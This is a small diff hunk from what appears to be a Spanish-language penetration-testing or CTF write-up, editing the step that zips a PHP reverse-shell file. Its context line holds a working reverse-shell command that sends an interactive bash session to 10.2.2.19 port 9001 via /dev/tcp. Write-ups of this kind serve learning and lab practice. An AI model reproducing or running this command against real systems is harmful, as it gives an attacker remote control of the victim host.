@@ -294,8 +294,8 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.2.19/9001 0>&1'");
 
 comprimir el archivo.
 
-```c
-❯ zip shell.zip revershell.php
+```python
+❯ zip revershell.zip revershell.php
   adding: revershell.php (deflated 28%)
 ```
 
